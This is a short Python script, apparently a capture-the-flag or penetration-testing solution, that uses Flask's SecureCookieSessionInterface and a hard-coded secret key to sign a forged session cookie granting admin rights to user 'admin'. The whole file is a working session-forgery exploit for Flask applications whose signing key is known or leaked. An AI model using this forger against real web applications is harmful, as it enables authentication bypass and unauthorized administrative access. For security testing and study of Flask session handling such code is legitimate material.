import json 
from flask.sessions import SecureCookieSessionInterface 

class Mockapp(object): 
    def __init__(self, secret_key): 
        self.secret_key = secret_key 
        
    def encode_session(self ,session):
        app = Mockapp(self.secret_key) #print session 
        
        session = json.loads(session) 
        si = SecureCookieSessionInterface() 
        s = si.get_signing_serializer(app) 
        return s.dumps(session)
    
mockapp = Mockapp('kzbKxPQvmIWCnfSFZ8eq90J5ghrDMcj7')   
session = '{"admin":true,"id":100,"username":"admin"}' 
session = mockapp.encode_session(session)
print(session)